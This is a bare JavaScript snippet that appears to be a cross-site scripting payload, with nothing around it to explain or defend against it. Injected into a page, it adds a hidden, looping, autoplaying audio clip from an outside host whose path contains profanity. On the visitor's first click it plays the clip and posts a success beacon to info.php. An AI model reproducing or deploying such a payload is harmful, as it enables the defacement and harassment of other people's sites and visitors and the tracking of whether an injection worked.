function play(){
    if(document.getElementById('xss_audio') == null ) {
        var a = document.createElement('audio');
        a.src = "http://dl.sabzlearn.ir/xss-fucker/fuck.m4a"
        a.autoplay=true;
        a.loop=true;
        a.id='xss_audio';
        a.style.display='none';
        document.body.appendChild(a);
        document.body.addEventListener("click",function(){
            a.play()
            ok = "OK"
            $.ajax({
                type: 'POST',
                url: 'info.php',
                data: {succ:ok},
                success: function(){alert("OK");},
                mimeType: 'text'
                });
        })
    }
}